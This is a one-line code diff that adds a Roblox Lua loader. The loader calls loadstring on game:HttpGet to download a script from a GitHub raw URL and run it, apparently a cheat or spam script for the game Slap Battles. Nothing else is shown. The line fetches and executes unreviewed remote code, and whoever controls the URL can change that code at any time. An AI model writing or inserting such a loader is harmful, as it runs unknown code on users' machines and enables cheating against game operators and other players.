@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/update-slap-battles-spam0-vi32f0eiidhli1.lua"))()
